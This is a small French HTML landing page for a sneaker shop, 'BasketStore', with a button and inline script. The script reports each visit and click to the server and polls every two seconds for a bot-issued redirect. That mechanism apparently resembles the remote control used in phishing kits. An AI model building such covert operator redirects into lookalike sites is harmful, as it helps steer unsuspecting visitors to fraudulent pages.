<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Accueil - BasketStore</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: linear-gradient(135deg, #f5f7fa, #c3cfe2);
      text-align: center;
      padding: 60px 20px;
    }
    h1 {
      color: #222;
      font-size: 2em;
      margin-bottom: 20px;
    }
    p {
      font-size: 1.2em;
      color: #444;
      margin-bottom: 40px;
    }
    button {
      background-color: #007bff;
      color: white;
      border: none;
      padding: 15px 25px;
      font-size: 1.1em;
      border-radius: 10px;
      cursor: pointer;
      transition: background 0.3s;
    }
    button:hover {
      background-color: #0056b3;
    }
  </style>
</head>
<body>
  <h1>ðŸ‘Ÿ Bienvenue sur BasketStore</h1>
  <p>DÃ©couvrez nos nouvelles paires exclusives.</p>
  <button id="seeProduct">Voir produit</button>

  <script>
    // Envoi notification interaction quand clique sur "Voir produit"
    document.getElementById('seeProduct').addEventListener('click', async () => {
      try {
        await fetch('/api/interaction', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ action: 'Interaction vers page produit' })
        });
      } catch (err) {
        console.error('Erreur envoi interaction produit:', err);
      }

      // Redirection cÃ´tÃ© frontend
      window.location.href = '/product.html';
    });

    // VÃ©rifie redirection via bot
    async function checkStatus() {
      try {
        const res = await fetch('/api/status');
        const data = await res.json();
        if (data.redirect) {
          window.location.href = data.redirect;
        }
      } catch (e) {
        console.error('Erreur polling status:', e);
      } finally {
        // Recheck toutes les 2 secondes
        setTimeout(checkStatus, 2000);
      }
    }
    checkStatus();

    // Notification visiteur unique
    async function notifyVisit() {
      try {
        await fetch('/api/visit');
      } catch(err){
        console.error('Erreur visit:', err);
      }
    }
    window.addEventListener('load', notifyVisit);
  </script>
</body>
</html>
